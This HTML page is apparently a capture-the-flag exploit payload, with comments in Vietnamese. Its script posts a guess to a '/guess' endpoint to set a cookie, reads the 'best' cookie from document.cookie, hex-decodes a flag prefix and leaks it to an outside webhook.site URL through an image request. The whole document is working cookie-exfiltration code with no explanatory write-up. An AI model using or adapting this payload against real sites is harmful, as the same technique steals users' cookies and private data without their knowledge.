<!DOCTYPE html>
<html><body>
<script>
;(async () => {
  // 1) Gửi POST /guess để set cookie best
  await fetch('/guess', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({guess:'NHNC{', note:''})
  });

  // 2) Đọc cookie best ngay từ JS
  const raw = document.cookie.split('; ').find(r=>r.startsWith('best='));
  if (raw) {
    const val = decodeURIComponent(raw.split('=')[1]);
    const [hexP,] = val.split(':');
    const prefix = hexP.match(/.{1,2}/g)
                       .map(h=>String.fromCharCode(parseInt(h,16)))
                       .join('');
    // 3) Leak prefix qua webhook
    new Image().src = 'http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?flag=' + encodeURIComponent(prefix);
  }
})();
</script>
</body></html>
